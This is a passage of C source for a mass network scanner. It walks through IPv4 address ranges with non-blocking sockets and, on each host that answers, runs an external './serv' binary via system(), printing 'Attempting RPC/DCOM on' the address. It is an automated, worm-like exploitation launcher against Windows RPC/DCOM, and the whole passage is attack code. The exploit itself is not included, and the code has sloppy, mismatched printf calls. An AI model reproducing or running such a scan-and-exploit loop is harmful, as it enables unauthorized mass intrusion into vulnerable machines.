   cc = 0;
   dd = 0;
   }
   else {
   if (aa < 255) {
   aa++;
   bb = 0;
   cc = 0;
   dd = 0;
   }
   else {
   ns = 0;
   for (k = 0; k < MAX_SOCKETS; k++) {
   if (connlist[k].status > S_NONE)
   ns++;
   }

   if (ns == 0)
   break;
   }
   }
   }
   }

   if (connlist[i].status == S_NONE) {
   connlist[i].s = socket(AF_INET, SOCK_STREAM, 0);
   if (connlist[i].s != -1) {
   ret = fcntl(connlist[i].s, F_SETFL, O_NONBLOCK);
   if (ret == -1) {
   printf("Unable to set O_NONBLOCK\n");
   close(connlist[i].s);
   }
   else {
   memset((char *)ip, 0, 20);
   sprintf(ip, "%d.%d.%d.%d", aa, bb, cc, dd);
   connlist[i].addr.sin_addr.s_addr = inet_addr(ip);
   if (connlist[i].addr.sin_addr.s_addr == -1)
   fatal("Invalid IP.");
   connlist[i].addr.sin_family = AF_INET;
   connlist[i].addr.sin_port = htons(port);
   connlist[i].a = time(0);
   connlist[i].status = S_CONNECTING;
   dd++;
   }
   }
   }
   }

   check_sockets();
   }

   }

   void init_sockets(void)
   {
   int i;

   for (i = 0; i < MAX_SOCKETS; i++) {
   connlist[i].status = S_NONE;
   memset((struct sockaddr_in *)&connlist[i].addr, 0,
   sizeof(struct sockaddr_in));
   }
   }

   void check_sockets(void)
   {
   int i, ret;

   for (i = 0; i < MAX_SOCKETS; i++) {
   if ((connlist[i].a < (time(0) - TIMEOUT)) &&
   (connlist[i].status == S_CONNECTING)) {
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }

   else if (connlist[i].status == S_CONNECTING) {
   ret = connect(connlist[i].s,
   (struct sockaddr *)&connlist[i].addr,
   sizeof(struct sockaddr_in));
   if (ret == -1) {
   if (errno == EISCONN) {
   printf("%s\n",
   (char *)inet_ntoa(connlist[i].addr.sin_addr),
   (time(0)-connlist[i].a));
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }

   if ((errno != EALREADY) && (errno != EINPROGRESS)) {
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }

   }

   else {
   char luck[100];
   sprintf(luck,"./serv %s",(char *)inet_ntoa(connlist[i].addr.sin_addr),(time(0)-connlist[i].a));
   printf("Attempting RPC/DCOM on %s\n",
   (char *)inet_ntoa(connlist[i].addr.sin_addr),
   (time(0)-connlist[i].a));
   system(luck);
   printf("Done with %s Next ...\n");
   close(connlist[i].s);
   connlist[i].status = S_NONE;
   }
   }
   }
   }

   void fatal(char *err)
   {
   int i;
   printf("Error: %s\n", err);
   for (i = 0; i < MAX_SOCKETS; i++) {
   if (connlist[i].status >= S_CONNECTING)
   close(connlist[i].s);
   }
   exit(-1);
   }

   ¡¡
